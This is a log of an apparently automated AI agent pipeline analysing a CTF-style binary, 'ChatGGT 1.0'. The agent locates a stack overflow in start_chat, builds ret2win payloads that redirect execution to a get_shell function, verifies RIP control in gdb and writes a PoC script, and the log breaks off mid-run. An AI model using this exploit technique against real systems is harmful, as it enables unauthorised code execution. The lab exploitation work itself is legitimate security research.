22:30:56 === Full Run: S1 → S2 → S3（所有 bug） → S4 ===

22:30:56 --- S1 Recon ---
22:30:56 === recon (bug_id=-) ===
22:30:56 [recon] → 调用 GLM...
22:31:03 [recon] ← GLM(7.3s): 调工具[elf_info, checksec, identify_libc, list_strings, sections]
22:31:03 [recon] 我将开始对目标二进制进行系统性侦察。先并行收集基础信息：ELF头、保护机制、libc识别、字符串、段表。
22:31:03 [recon]   → 工具 elf_info({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target"})
22:31:03 [recon]   → 工具 checksec({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target"})
22:31:03 [recon]   → 工具 identify_libc({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target"})
22:31:03 [recon]   → 工具 list_strings({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "max_lines": 200})
22:31:03 [recon]   → 工具 sections({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target"})
22:31:03 [recon]   ← list_strings(0.0s): /lib64/ld-linux-x86-64.so.2 ⏎ read ⏎ alarm ⏎ __libc_start_main ⏎ setvbuf ⏎ strncmp ⏎ stdout ⏎ puts ⏎ system ⏎ stdin ⏎ stderr ⏎ printf ⏎ libc.so.6 ⏎ GL...(1395 chars)
22:31:03 [recon]   ← sections(0.0s): There are 31 section headers, starting at offset 0x3860: ⏎  ⏎ Section Headers: ⏎   [Nr] Name              Type             Address           Offset ⏎ ...(4807 chars)
22:31:03 [recon]   ← elf_info(0.0s): /work/workspace/0032-2024-64-chatggt-20260909-223056/target: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib...(4176 chars)
22:31:03 [recon]   ← identify_libc(0.0s): 	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007194a5a65000) ⏎ ===LIBC VERSION=== ⏎ GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.8) stable release ...(166 chars)
22:31:03 [recon]   ← checksec(0.2s): [*] '/work/workspace/0032-2024-64-chatggt-20260909-223056/target' ⏎     Arch:       amd64-64-little ⏎     RELRO:      Partial RELRO ⏎     Stack:      ...(306 chars)
22:31:03 [recon] → 调用 GLM...
22:31:08 [recon] ← GLM(4.7s): 调工具[symbols, global_vars, got_plt, disassemble, cfg]
22:31:08 [recon] 基础信息已收集。这是一个简单的64位ELF，有 `main`、`start_chat`、`get_shell` 函数，含 `system` 和 `/bin/sh`。现在并行收集符号、全局变量、GOT/PLT、反汇编、CFG。
22:31:08 [recon]   → 工具 symbols({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "max_lines": 100})
22:31:08 [recon]   → 工具 global_vars({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "max_lines": 60})
22:31:08 [recon]   → 工具 got_plt({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target"})
22:31:08 [recon]   → 工具 disassemble({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "lines": 200})
22:31:08 [recon]   → 工具 cfg({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target"})
22:31:08 [recon]   ← global_vars(0.0s):     10: 0000000000404060     8 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.2.5 (3) ⏎     11: 0000000000404070     8 OBJECT  GLOBAL DEFAULT   26 stdin@G...(1277 chars)
22:31:08 [recon]   ← got_plt(0.0s): [{"offset": "0000000000403ff0", "type": "R_X86_64_GLOB_DAT", "value": "__libc_start_main@GLIBC_2.34"}, {"offset": "0000000000403ff8", "type": "R_X86_6...(1106 chars)
22:31:08 [recon]   ← symbols(0.0s): 0000000000403e20 d _DYNAMIC ⏎ 0000000000404000 d _GLOBAL_OFFSET_TABLE_ ⏎ 0000000000402000 R _IO_stdin_used ⏎ 00000000004021b8 r __FRAME_END__ ⏎ 000000...(1462 chars)
22:31:08 [recon]   ← disassemble(0.0s):  ⏎ /work/workspace/0032-2024-64-chatggt-20260909-223056/target:     file format elf64-x86-64 ⏎  ⏎  ⏎ Disassembly of section .init: ⏎  ⏎ 00000000004010...(6200 chars)
22:31:09 [recon]   ← cfg(1.0s): [{"name": "_init", "addr": "0x401000", "blocks": 3, "calls": ["UnresolvableCallTarget"]}, {"name": "sub_401020", "addr": "0x401020", "blocks": 1, "cal...(4201 chars)
22:31:09 [recon] → 调用 GLM...
22:31:15 [recon] ← GLM(5.9s): 调工具[disassemble, disassemble, disassemble, disassemble]
22:31:15 [recon] 反汇编在 `init` 函数末尾被截断了。我需要看 `start_chat` 和 `main` 的完整反汇编。让我单独反汇编这两个关键函数。
22:31:15 [recon]   → 工具 disassemble({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "function": "start_chat", "lines": 100})
22:31:15 [recon]   → 工具 disassemble({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "function": "main", "lines": 50})
22:31:15 [recon]   → 工具 disassemble({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "function": "get_shell", "lines": 20})
22:31:15 [recon]   → 工具 disassemble({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "function": "init", "lines": 50})
22:31:15 [recon]   ← disassemble(0.0s): 000000000040127f <start_chat>: ⏎   40127f:	endbr64 ⏎   401283:	push   rbp ⏎   401284:	mov    rbp,rsp ⏎   401287:	sub    rsp,0x100 ⏎   40128e:	lea    r...(1093 chars)
22:31:15 [recon]   ← disassemble(0.0s): 0000000000401301 <main>: ⏎   401301:	endbr64 ⏎   401305:	push   rbp ⏎   401306:	mov    rbp,rsp ⏎   401309:	mov    eax,0x0 ⏎   40130e:	call   401210 <i...(429 chars)
22:31:15 [recon]   ← disassemble(0.0s): 0000000000401210 <init>: ⏎   401210:	endbr64 ⏎   401214:	push   rbp ⏎   401215:	mov    rbp,rsp ⏎   401218:	mov    rax,QWORD PTR [rip+0x2e51]        # ...(913 chars)
22:31:15 [recon]   ← disassemble(0.0s): 00000000004011f6 <get_shell>: ⏎   4011f6:	endbr64 ⏎   4011fa:	push   rbp ⏎   4011fb:	mov    rbp,rsp ⏎   4011fe:	lea    rax,[rip+0xe03]        # 402008...(298 chars)
22:31:15 [recon] → 调用 GLM...
22:31:20 [recon] ← GLM(4.6s): 调工具[probe_io, execute, execute]
22:31:20 [recon] 关键发现已清晰。`start_chat` 中：栈缓冲区 `rbp-0x100`（256字节），`read` 读取 0x12c=300 字节，存在栈溢出（300 > 256）。`get_shell` 调用 `system("/bin/sh")`。现在做动态探测确认 I/O 时序，并检查 RPATH/R
22:31:20 [recon]   → 工具 probe_io({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "steps": "[{\"recv_until\": \"Question\", \"send\": \"hello\"}, {\"recv_unti)
22:31:20 [recon]   → 工具 execute({"command": "readelf -d /work/workspace/0032-2024-64-chatggt-20260909-223056/target | grep -iE 'path|needed|rpath|runpath|soname|bind'"})
22:31:20 [recon]   → 工具 execute({"command": "objdump -s -j .rodata /work/workspace/0032-2024-64-chatggt-20260909-223056/target"})
22:31:20 [recon]   ← execute(0.0s):  0x0000000000000001 (NEEDED)             Shared library: [libc.so.6] ⏎  ⏎ [Command succeeded with exit code 0]
22:31:20 [recon]   ← execute(0.0s):  ⏎ /work/workspace/0032-2024-64-chatggt-20260909-223056/target:     file format elf64-x86-64 ⏎  ⏎ Contents of section .rodata: ⏎  402000 01000200 0000...(616 chars)
22:31:20 [recon]   ← probe_io(0.1s): RECV: b'>>>ChatGGT 1.0<<<\n\nQuestion' ⏎ SEND: 'hello' ⏎ RECV: b' (Input EXIT to leave the chat): I don\'t understand "hello\n"?\n\nQuestion' ⏎ SEND: ...(206 chars)
22:31:20 [recon] → 调用 GLM...
22:32:29 [recon] ← GLM(69.5s): 调工具[submit_final_result]
22:32:29 [recon] 所有关键事实已收集完毕。让我确认一下栈布局的精确计算，并验证溢出偏移。  关键数据流分析： - `start_chat`: `sub rsp, 0x100` (256字节栈帧)，`read(0, rbp-0x100, 0x12c)` 读取300字节 - 缓冲区在 `rbp-0x100`，到 `rbp
22:32:29 [recon] ✓ submit_final_result 收到最终报告（ReconReport 校验通过，16054 chars）
22:32:29 [recon] → 调用 GLM...
22:32:35 [recon] ← GLM(5.7s)
22:32:35 [recon] S1 侦察已完成并提交。核心发现摘要：  **二进制**：ChatGGT 1.0，64位 ELF，非PIE（基址 0x400000），动态链接 glibc 2.39，未 strip。  **保护机制**：Partial RELRO、NX 开、**无 Canary**、无 PIE、CET(IBT+SH
22:32:35 [stage1] 保存 → /work/workspace/0032-2024-64-chatggt-20260909-223056/stage1.json
22:32:35 --- S2 Semantic ---
22:32:35 === semantic (bug_id=-) ===
22:32:35 [semantic] → 调用 GLM...
22:32:41 [semantic] ← GLM(5.9s): 调工具[disassemble, disassemble, disassemble]
22:32:41 [semantic] 我将通过检查关键函数的反汇编来分析二进制文件，以验证 S1 事实并建立根本原因证据链。
22:32:41 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "function": "start_chat", "lines": 100})
22:32:41 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "function": "get_shell", "lines": 30})
22:32:41 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "function": "main", "lines": 30})
22:32:41 [semantic]   ← disassemble(0.0s): 00000000004011f6 <get_shell>: ⏎   4011f6:	endbr64 ⏎   4011fa:	push   rbp ⏎   4011fb:	mov    rbp,rsp ⏎   4011fe:	lea    rax,[rip+0xe03]        # 402008...(298 chars)
22:32:41 [semantic]   ← disassemble(0.0s): 000000000040127f <start_chat>: ⏎   40127f:	endbr64 ⏎   401283:	push   rbp ⏎   401284:	mov    rbp,rsp ⏎   401287:	sub    rsp,0x100 ⏎   40128e:	lea    r...(1093 chars)
22:32:41 [semantic]   ← disassemble(0.0s): 0000000000401301 <main>: ⏎   401301:	endbr64 ⏎   401305:	push   rbp ⏎   401306:	mov    rbp,rsp ⏎   401309:	mov    eax,0x0 ⏎   40130e:	call   401210 <i...(429 chars)
22:32:41 [semantic] → 调用 GLM...
22:32:43 [semantic] ← GLM(2.2s): 调工具[checksec, symbols]
22:32:43 [semantic] 反汇编结果确认了 S1 的事实。现在让我验证一下安全缓解措施，并检查是否存在任何 canary 相关的指令。
22:32:43 [semantic]   → 工具 checksec({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target"})
22:32:43 [semantic]   → 工具 symbols({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "filter": "stack_chk"})
22:32:43 [semantic]   ← symbols(0.0s): <no output>
22:32:44 [semantic]   ← checksec(0.3s): [*] '/work/workspace/0032-2024-64-chatggt-20260909-223056/target' ⏎     Arch:       amd64-64-little ⏎     RELRO:      Partial RELRO ⏎     Stack:      ...(306 chars)
22:32:44 [semantic] → 调用 GLM...
22:32:50 [semantic] ← GLM(6.2s): 调工具[disassemble]
22:32:50 [semantic] 所有事实已确认。让我验证一下栈帧布局，以精确计算溢出偏移量。  反汇编确认了完整的证据链：  1. **`start_chat` 栈帧**：`push rbp` (保存 rbp) → `mov rbp,rsp` → `sub rsp,0x100` (256 字节缓冲区) 2. **`read` 调用
22:32:50 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "function": "init", "lines": 40})
22:32:50 [semantic]   ← disassemble(0.0s): 0000000000401210 <init>: ⏎   401210:	endbr64 ⏎   401214:	push   rbp ⏎   401215:	mov    rbp,rsp ⏎   401218:	mov    rax,QWORD PTR [rip+0x2e51]        # ...(913 chars)
22:32:50 [semantic] → 调用 GLM...
22:33:54 [semantic] ← GLM(64.0s): 调工具[submit_final_result]
22:33:54 [semantic] 所有函数已完成反汇编。我已掌握所需的全部证据。让我来汇总分析结果：  **外部库调用点审查 (libc.so.6 — 唯一的 NEEDED 库):**  1. **`read(0, rbp-0x100, 0x12c)`** @ 0x4012b6 — 返回值未检查（未测试 eax）。然而，漏洞不在于返
22:33:54 [semantic] ✓ submit_final_result 收到最终报告（VulnerabilityReport 校验通过，11001 chars）
22:33:54 [semantic] → 调用 GLM...
22:33:59 [semantic] ← GLM(5.3s)
22:33:59 [semantic] S2 语义漏洞分析已完成并提交。报告总结如下：  **发现 1 个高危漏洞 (BUG-001)：`start_chat` 中的栈缓冲区溢出**  - **根本原因**：`read(0, rbp-0x100, 0x12c)` 将最多 300 字节读取到 256 字节的栈缓冲区中，溢出了 44 字节，且
22:33:59 [stage2] 保存 → /work/workspace/0032-2024-64-chatggt-20260909-223056/stage2.json
22:33:59 --- S3 Primitive（所有 bug） ---
22:33:59 === impact (bug_id=BUG-001) ===
22:33:59 [impact:BUG-001] → 调用 GLM...
22:34:07 [impact:BUG-001] ← GLM(7.4s): 调工具[disassemble, disassemble, disassemble]
22:34:07 [impact:BUG-001] I'll analyze BUG-001 (stack buffer overflow in start_chat) to derive and verify primitives. Let me start by examining the binary's disassembly and sec
22:34:07 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "function": "start_chat"})
22:34:07 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "function": "get_shell"})
22:34:07 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "function": "main"})
22:34:07 [impact:BUG-001]   ← disassemble(0.0s): 00000000004011f6 <get_shell>: ⏎   4011f6:	endbr64 ⏎   4011fa:	push   rbp ⏎   4011fb:	mov    rbp,rsp ⏎   4011fe:	lea    rax,[rip+0xe03]        # 402008...(298 chars)
22:34:07 [impact:BUG-001]   ← disassemble(0.0s): 000000000040127f <start_chat>: ⏎   40127f:	endbr64 ⏎   401283:	push   rbp ⏎   401284:	mov    rbp,rsp ⏎   401287:	sub    rsp,0x100 ⏎   40128e:	lea    r...(1093 chars)
22:34:07 [impact:BUG-001]   ← disassemble(0.0s): 0000000000401301 <main>: ⏎   401301:	endbr64 ⏎   401305:	push   rbp ⏎   401306:	mov    rbp,rsp ⏎   401309:	mov    eax,0x0 ⏎   40130e:	call   401210 <i...(429 chars)
22:34:07 [impact:BUG-001] → 调用 GLM...
22:34:11 [impact:BUG-001] ← GLM(4.0s): 调工具[checksec, probe_io]
22:34:11 [impact:BUG-001] Good, I have the disassembly. Now let me check security properties and probe the I/O behavior.
22:34:11 [impact:BUG-001]   → 工具 checksec({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target"})
22:34:11 [impact:BUG-001]   → 工具 probe_io({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "steps": "[{\"recv_until\": \"Question\", \"send\": \"hello\"}, {\"recv_unti)
22:34:11 [impact:BUG-001]   ← probe_io(0.1s): RECV: b'>>>ChatGGT 1.0<<<\n\nQuestion' ⏎ SEND: 'hello' ⏎ RECV: b' (Input EXIT to leave the chat): I don\'t understand "hello\n"?\n\nQuestion' ⏎ SEND: ...(206 chars)
22:34:11 [impact:BUG-001]   ← checksec(0.1s): [*] '/work/workspace/0032-2024-64-chatggt-20260909-223056/target' ⏎     Arch:       amd64-64-little ⏎     RELRO:      Partial RELRO ⏎     Stack:      ...(306 chars)
22:34:11 [impact:BUG-001] → 调用 GLM...
22:34:14 [impact:BUG-001] ← GLM(3.1s): 调工具[find_offset]
22:34:14 [impact:BUG-001] Good. I/O confirmed. Now let me verify the overflow offset and test if CET (Shadow Stack) is enforced at runtime. I'll use a cyclic pattern to find th
22:34:14 [impact:BUG-001]   → 工具 find_offset({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "length": 300})
22:34:34 [impact:BUG-001]   ← find_offset(19.9s): timeout (no crash within 15s)
22:34:34 [impact:BUG-001] → 调用 GLM...
22:34:38 [impact:BUG-001] ← GLM(4.5s)
22:34:38 [impact:BUG-001] The cyclic pattern didn't crash — likely because the first 4 bytes of the cyclic pattern matched something that caused the loop to continue, or the pa
22:34:38 [retry] 无 submit（1/5），原地重试...
22:34:38 [impact:BUG-001] → 调用 GLM...
22:34:43 [impact:BUG-001] ← GLM(4.7s): 调工具[make_payload]
22:34:43 [impact:BUG-001] 让我创建一个合适的有效载荷来测试偏移量。该缓冲区大小为 256 字节，保存的 RBP 在偏移量 256 处，返回地址在偏移量 264 处。我需要发送 300 字节，且前 4 个字节不能是 "EXIT"。
22:34:43 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0032-2024-64-chatggt-20260909-223056/payload_test1", "parts": [["AAAA", 1], ["B", 252], ["CCCCCCCC", 1], ["DDDDDDDD", 1)
22:34:43 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0032-2024-64-chatggt-20260909-223056/payload_test1 len=302 preview_hex=414141414242424242424242424242424242424242424242424242424242424...(151 chars)
22:34:43 [impact:BUG-001] → 调用 GLM...
22:34:48 [impact:BUG-001] ← GLM(4.6s): 调工具[make_payload]
22:34:48 [impact:BUG-001] 长度是 302，太长了。让我精确修正一下：4 (AAAA) + 252 (B) + 8 (CCCCCCCC) + 8 (DDDDDDDD) + 28 (E*28) = 300。
22:34:48 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0032-2024-64-chatggt-20260909-223056/payload_test1", "parts": [["AAAA", 1], ["B", 252], ["CCCCCCCC", 1], ["DDDDDDDD", 1)
22:34:48 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0032-2024-64-chatggt-20260909-223056/payload_test1 len=300 preview_hex=414141414242424242424242424242424242424242424242424242424242424...(151 chars)
22:34:48 [impact:BUG-001] → 调用 GLM...
22:34:52 [impact:BUG-001] ← GLM(4.3s): 调工具[gdb_run_crash]
22:34:52 [impact:BUG-001] 300 字节。现在让我运行它以查看是否会发生崩溃。前 4 个字节是 "AAAA"（不是 "EXIT"），因此循环会继续。但是等等——在 `printf` 回显之后，循环会返回并再次调用 `read()`。由于我们的 `payload` 是通过管道传输的，第二次 `read()` 将获得 `EOF`（
22:34:52 [impact:BUG-001]   → 工具 gdb_run_crash({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "payload_file": "/work/workspace/0032-2024-64-chatggt-20260909-223056/payloa)
22:35:52 [impact:BUG-001]   ← gdb_run_crash(60.2s): {"raw_tail": "(gdb timed out)"}
22:35:52 [impact:BUG-001] → 调用 GLM...
22:35:58 [impact:BUG-001] ← GLM(5.5s): 调工具[make_payload]
22:35:58 [impact:BUG-001] 程序没有崩溃——它卡在了循环中，因为 `read()` 在 `EOF` 时返回 0，并且 `strncmp` 将空缓冲区与 "EXIT" 进行比较（不相等），所以它一直在循环。我需要让程序退出循环以触发 `leave; ret`。我需要发送一个溢出 `payload`，其前 4 个字节必须是 "EX
22:35:58 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0032-2024-64-chatggt-20260909-223056/payload_exit_overflow", "parts": [["EXIT", 1], ["B", 252], ["CCCCCCCC", 1], ["DDDD)
22:35:58 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0032-2024-64-chatggt-20260909-223056/payload_exit_overflow len=300 preview_hex=4558495442424242424242424242424242424242424242424242424...(159 chars)
22:35:58 [impact:BUG-001] → 调用 GLM...
22:36:01 [impact:BUG-001] ← GLM(3.3s): 调工具[gdb_run_crash]
22:36:01 [impact:BUG-001] 现在前 4 个字节是 "EXIT" → `strncmp` 返回 0 → 跳转到 `leave; ret` → 使用损坏的返回地址 (CCCCCCCC = 0x4343434343434343)。让我运行一下：
22:36:01 [impact:BUG-001]   → 工具 gdb_run_crash({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "payload_file": "/work/workspace/0032-2024-64-chatggt-20260909-223056/payloa)
22:36:01 [impact:BUG-001]   ← gdb_run_crash(0.3s): {"signal": "SIGSEGV", "crash_addr": "0x0000000000401300", "crash_loc": "Segmentation fault.", "raw_tail": "()\n#3  0x4545454545454545 in ?? ()\n#4  0x...(420 chars)
22:36:01 [impact:BUG-001] → 调用 GLM...
22:36:06 [impact:BUG-001] ← GLM(4.9s): 调工具[gdb_run]
22:36:06 [impact:BUG-001] 太棒了！程序在 `0x401300` (`start_chat` 中的 `ret` 指令) 处因 SIGSEGV 而崩溃。回溯（backtrace）显示 `0x4545454545454545` 出现在栈上——但等等，我的布局是：偏移量 0-3 = "EXIT"，偏移量 4-255 = 'B'*25
22:36:06 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "commands": "b *0x401300; run < /work/workspace/0032-2024-64-chatggt-2026090)
22:36:06 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x401300 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(669 chars)
22:36:06 [impact:BUG-001] → 调用 GLM...
22:36:17 [impact:BUG-001] ← GLM(10.7s): 调工具[make_payload]
22:36:17 [impact:BUG-001] 现在我可以清楚地看到布局了： - RBP = 0x4343434343434343 (CCCCCCCC) — 在偏移量 256 处的保存的 RBP 已被覆盖 - RSP 指向 0x4444444444444444 (DDDDDDDD) — 这是在偏移量 264 处的返回地址 - 接下来是 0x454
22:36:17 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0032-2024-64-chatggt-20260909-223056/payload_rip_control", "parts": [["EXIT", 1], ["B", 252], ["CCCCCCCC", 1], ["\\xf6\)
22:36:17 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0032-2024-64-chatggt-20260909-223056/payload_rip_control len=300 preview_hex=455849544242424242424242424242424242424242424242424242424...(157 chars)
22:36:17 [impact:BUG-001] → 调用 GLM...
22:36:20 [impact:BUG-001] ← GLM(3.2s): 调工具[gdb_run]
22:36:20 [impact:BUG-001] 现在让我使用 gdb 进行验证——在 `ret` 处设置断点，然后单步执行以查看 RIP 是否变为 `get_shell` (0x4011f6)：
22:36:20 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "commands": "b *0x401300; run < /work/workspace/0032-2024-64-chatggt-2026090)
22:36:20 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x401300 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(652 chars)
22:36:20 [impact:BUG-001] → 调用 GLM...
22:36:26 [impact:BUG-001] ← GLM(5.6s): 调工具[make_payload]
22:36:26 [impact:BUG-001] **RIP_CONTROL 已验证！** 在执行 `stepi`（单步执行 `ret` 指令）后，RIP = 0x4011f6 = `get_shell`。攻击者控制的返回地址被加载到 RIP 中。栈顶包含 0x00000000004011f6（我们注入的值），并且在执行 `ret` 后，RIP 变
22:36:26 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0032-2024-64-chatggt-20260909-223056/payload_rip_control2", "parts": [["EXIT", 1], ["B", 252], ["CCCCCCCC", 1], ["\\x41)
22:36:26 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0032-2024-64-chatggt-20260909-223056/payload_rip_control2 len=300 preview_hex=45584954424242424242424242424242424242424242424242424242...(158 chars)
22:36:26 [impact:BUG-001] → 调用 GLM...
22:36:29 [impact:BUG-001] ← GLM(3.5s): 调工具[gdb_run]
22:36:30 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "commands": "b *0x401300; run < /work/workspace/0032-2024-64-chatggt-2026090)
22:36:30 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x401300 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(489 chars)
22:36:30 [impact:BUG-001] → 调用 GLM...
22:36:36 [impact:BUG-001] ← GLM(6.2s): 调工具[gdb_run]
22:36:36 [impact:BUG-001] 有趣的是，在 `stepi` 之后，程序在 `0x401300` 处发生了 `SIGSEGV`。这是因为 `0xdeadbeef41414141` 是一个不可映射的地址。`ret` 指令试图跳转到该地址并导致了崩溃。但关键点在于：栈中包含了 `0xdeadbeef41414141`（我们注入的值），
22:36:36 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0032-2024-64-chatggt-20260909-223056/target", "commands": "b *0x401300; run < /work/workspace/0032-2024-64-chatggt-2026090)
22:36:36 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x401300 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(533 chars)
22:36:36 [impact:BUG-001] → 调用 GLM...
22:37:05 [impact:BUG-001] ← GLM(28.9s): 调工具[write_file]
22:37:05 [impact:BUG-001] 在 `ret` 之后，RBP = 0x4343434343434343（我们覆盖的值），RIP = 0x4011f6 (get_shell)。`leave` 指令将 RBP 设置为我们的受控值，并且 `ret` 将 RIP 设置为我们的受控值。这证实了 STACK_CONTROL（保存的 RBP 覆
22:37:05 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nPoC for BUG-001: Stack Buffer Overflow in start_chat\nBinary: /work/workspace/0032-2024-64-chatggt-202609)
22:37:05 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0032-2024-64-chatggt-20260909-223056/poc-BUG-001.py
22:37:05 [impact:BUG-001] → 调用 GLM...
22:37:08 [impact:BUG-001] ← GLM(2.3s): 调工具[run_script]
22:37:08 [impact:BUG-001] 现在让我运行 PoC 来收集所有证据：
22:37:08 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0032-2024-64-chatggt-20260909-223056/poc-BUG-001.py", "timeout": 30})
22:37:08 [impact:BUG-001]   ← run_script(0.8s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === PRIM-003: Testing CRASH (invalid return address) === ⏎   Return code: -11 ⏎   Signal: 11 ⏎   === PRIM-003: VE...(273 chars)
22:37:08 [impact:BUG-001] → 调用 GLM...
22:37:11 [impact:BUG-001] ← GLM(2.4s): 调工具[run_script]
22:37:11 [impact:BUG-001] 崩溃测试已通过。现在让我运行完整的 GDB 验证：
22:37:11 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0032-2024-64-chatggt-20260909-223056/poc-BUG-001.py", "timeout": 45, "max_chars": 5000})
22:37:11 [impact:BUG-001]   ← run_script(0.0s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === PRIM-003: Testing CRASH (invalid return address) === ⏎   Return code: -11 ⏎   Signal: 11 ⏎   === PRIM-003: VE...(273 chars)
22:37:11 [impact:BUG-001] → 调用 GLM...
22:37:17 [impact:BUG-001] ← GLM(6.6s): 调工具[execute]
22:37:17 [impact:BUG-001] 脚本没有运行 GDB 路径，因为我没有传递 `--gdb` 参数。让我来修复一下：
22:37:17 [impact:BUG-001]   → 工具 execute({"command": "cd /work/workspace/0032-2024-64-chatggt-20260909-223056 && python3 poc-BUG-001.py --gdb 2>&1", "timeout": "45"})
22:37:18 [impact:BUG-001]   ← execute(0.8s): === PRIM-001: Testing RIP_CONTROL (return address = get_shell 0x4011f6) === ⏎ === PRIM-002: Testing STACK_CONTROL (saved RBP = 0x4343434343434343) ===...(827 chars)
22:37:18 [impact:BUG-001] → 调用 GLM...
22:37:23 [impact:BUG-001] ← GLM(4.8s): 调工具[execute]
22:37:23 [impact:BUG-001] GDB 子进程输出过滤不起作用，因为 GDB 的输出格式不同。让我调试一下——问题很可能是 GDB 的 `-ex` 参数处理多个命令的方式。让我直接测试一下：
22:37:23 [impact:BUG-001]   → 工具 execute({"command": "cd /work/workspace/0032-2024-64-chatggt-20260909-223056 && python3 -c \"\nimport subprocess\npayload = b'EXIT' + b'B'*252 + b'C'*8 + b'\\)
22:37:23 [impact:BUG-001]   ← execute(0.1s): STDOUT: ⏎  ⏎ STDERR: ⏎ Invalid character ';' in expression. ⏎  ⏎  ⏎ [Command succeeded with exit code 0]
22:37:23 [impact:BUG-001] → 调用 GLM...
22:37:32 [impact:BUG-001] ← GLM(8.5s): 调工具[edit_file]
22:37:32 [impact:BUG-001] 问题在于 `gdb -ex` 不支持用分号分隔命令。我需要使用多个 `-ex` 标志。让我来修复一下脚本：
22:37:32 [impact:BUG-001]   → 工具 edit_file({"file_path": "/work/workspace/0032-2024-64-chatggt-20260909-223056/poc-BUG-001.py", "new_string": "    # gdb commands: break at ret instruction, run,)
22:37:32 [impact:BUG-001]   ← edit_file(0.0s): Successfully replaced 1 instance(s) of the string in '/work/workspace/0032-2024-64-chatggt-20260909-223056/poc-BUG-001.py'
22:37:32 [impact:BUG-001] → 调用 GLM...
22:37:37 [impact:BUG-001] ← GLM(5.8s): 调工具[edit_file]
22:37:37 [impact:BUG-001]   → 工具 edit_file({"file_path": "/work/workspace/0032-2024-64-chatggt-20260909-223056/poc-BUG-001.py", "new_string": "    gdb_args2 = [\n        \"gdb\", \"-q\", \"-bat)
22:37:37 [impact:BUG-001]   ← edit_file(0.0s): Successfully replaced 1 instance(s) of the string in '/work/workspace/0032-2024-64-chatggt-20260909-223056/poc-BUG-001.py'
22:37:37 [impact:BUG-001] → 调用 GLM...
22:37:39 [impact:BUG-001] ← GLM(1.7s): 调工具[execute]
22:37:39 [impact:BUG-001]   → 工具 execute({"command": "cd /work/workspace/0032-2024-64-chatggt-20260909-223056 && python3 poc-BUG-001.py --gdb 2>&1", "timeout": 45})
